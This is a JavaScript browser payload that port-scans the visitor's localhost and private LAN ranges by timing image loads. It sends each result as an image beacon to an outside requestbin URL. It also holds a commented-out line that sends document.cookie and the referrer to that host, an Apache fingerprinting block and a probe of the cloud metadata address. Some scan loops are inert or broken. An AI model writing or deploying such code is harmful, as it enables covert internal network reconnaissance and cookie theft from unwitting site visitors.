let LOG_URL = "https://requestbin.net/r/5git21w4";
  let ipIterator="";
  let local_ip_ranges = ["10.", "192.168.", "172.16."];

  let imCoo = new Image();
  //Just To Exfiltrate Referer, Cookies -> imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
   /*
   Uncomment to fingerprint Apache Servers
   imCoo.src="http://127.0.0.1:80/icons/apache_pb.png";
    imCoo.onerror = function()
    {
      let imL = new Image();
      imL.src = LOG_URL + "?NO APACHE";
    }
    imCoo.onload = function()
    {
      let imL = new Image();
      imL.src = LOG_URL + "?APACHE FOUND";
    }
    */
   //
    var last_scanobj_index = 0;
    var scanobjs = {};
    var time = 0;

    function PortScanner(ip, port)
    {

        this.ip = ip;
        this.port = port;
        this.on_open_or_closed = null;
        this.on_stealthed = null;
        this.start_time = null;
        this.timed_out = null;
        this.total_time = null;

        this.run = function () {
            /* Check that the client gave us all the callbacks we need. */
            if (this.on_open_or_closed == null) {
                alert("Please set the on_open_or_closed callback!");
            }
            if (this.on_stealthed == null) {
                alert("Please set the on_stealthed callback!");
            }

            /* Save this object in the global directory (UGLY HACK). */
            var our_scanobj_index = last_scanobj_index;
            last_scanobj_index++;
            scanobjs[our_scanobj_index] = this;

            /* Record the starting time. */
            this.start_time = (new Date()).getTime();

            var thiss = this;
            setTimeout(
                function () {
                    /* This will be non-null if the event hasn't fired yet. */
                    if (scanobjs[our_scanobj_index]) {
                        scanobjs[our_scanobj_index] = null;
                        thiss.timed_out = true;
                        thiss.on_stealthed();
                    }
                },
                4000/*10000*/
            );
        }
    }

    function error_handler(index)
    {
        /* Get the PortScanner object back. */
        var thiss = scanobjs[index];

        /* If it's null, the scan timed out. */
        if (thiss == null) {
            return;
        }
        /* Set it to null so the timeout knows we handled it. */
        scanobjs[index] = null;
        thiss.timed_out = false;

        /* Measure the amount of time it took for the load to fail. */
        thiss.total_time = (new Date()).getTime() - thiss.start_time;

        /* Call the appropriate callback. */
        if (thiss.total_time < 1500) {
            thiss.on_open_or_closed();
        } else {
            thiss.on_stealthed();
        }
    }

    function custom_scan(ip, port)
    {
        var ip_addr_re = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;

        var match = ip_addr_re.exec(ip);
        if ( match == null ) {
            return;
        }

        if (match[1] > 255 || match[2] > 255 || match[3] > 255 || match[4] > 255) {
            alert("That isn't a valid IPv4 address.");
        }

        port = parseInt(port);
        if (isNaN(port) || port < 0 || port > 65535) {
            alert("Bad port number");
        }

        var scanner = new PortScanner(ip, port);

        scanner.on_stealthed = function () {
            if (scanner.timed_out)
            {
                let im = new Image();
                im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 5SEC&IP="+ip+"&PORT=" + port;
            }
            else
            {
                  time = this.total_time;
                  let im = new Image();
                  im.src=LOG_URL+"?TIME="+time+"&IP="+ip+"&CASE=2&PORT=" + port;
              }
        }

        scanner.on_open_or_closed = function ()
        {
            time = this.total_time;
            let im = new Image();
            im.src=LOG_URL+"?TIME="+time+"&IP="+ip+"&CASE=1&PORT=" + port;
        }

        scanner.run();
    }

    /* This variable keeps track of which 192.168.1 IP to scan next. */
    var current_octet;
    var stop;
    function lan_scan(form)
    {
        /* Skip .1 since it might visibly prompt for a password. */
        current_octet = 2;
        stop = false;

        var scanner = new PortScanner("192.168.1." + current_octet, 80);
        scanner.on_stealthed = lan_on_stealthed;
        scanner.on_open_or_closed = lan_on_open_or_closed;
        scanner.run();
    }

    function lan_stop(form)
    {
        stop = true;
    }

    function lan_on_stealthed()
    {
        if (this.timed_out) {
        } else {
          time = this.total_time;
        }

        current_octet += 1;

        if (stop || current_octet >= 255) {
            return;
        }

        var scanner = new PortScanner("192.168.1." + current_octet, 80);
        scanner.on_stealthed = lan_on_stealthed;
        scanner.on_open_or_closed = lan_on_open_or_closed;
        scanner.run();
    }

    function lan_on_open_or_closed()
    {
        time = this.total_time;
        current_octet += 1;

        if (stop || current_octet >= 255) {
            res_div.innerHTML += "Done. <br />";
            return;
        }

        var scanner = new PortScanner("192.168.1." + current_octet, 80);
        scanner.on_stealthed = lan_on_stealthed;
        scanner.on_open_or_closed = lan_on_open_or_closed;
        scanner.run();
    }

    custom_scan("127.0.0.1", "80");


for (let i = 0 ; i < local_ip_ranges.length ; i++)
{
    let ip = "";
    let bit1 = 0;
    let bit2 = 0;
    let bit3 = 20;
    let bit4 = 0;

    //10.X.X.X
    if (i == 0)
    {
        ip = "10.";
        while (bit2 <= 255)
        {
          while (bit3 <= 255)
          {
            while (bit4 < 1)
            {
              bit4++;
              ip = "10." + bit2 + "." + bit3 + "." + bit4;
              //custom_scan(ip, "80");
            }
            bit4 = 0;
            bit3++;
          }
          bit3 = 0;
          bit2++;
        }
        bit2 = 0;
    }
    //192.168.X.X
    else if (i == 1)
    {
        ip = "192.168.";
        while (bit3 <= 40)
        {
          while (bit4 < 1)
          {
            bit4++;
            ip = "192.168." + bit3 + "." + bit4;
            //custom_scan(ip, "80");
          }
          bit4 = 0;
          bit3++;
        }
        bit3 = 0;
    }
    //172.<16-254>.X
    else if (i == 2)
    {
        ip = "172.";
        bit2 = 66;

        while (bit2 <= 50)
        {
          while (bit3 < 1)
          {
            while (bit4 < 1)
            {
              bit4++;
              ip = "172." + bit2 + ".1" + "." + bit4;
              //custom_scan("169.254.169.254", "80");
            }
            bit4 = 0;
            bit3++;
          }
          bit3 = 0;
          bit2++;
        }
        bit2 = 0;
    }
}
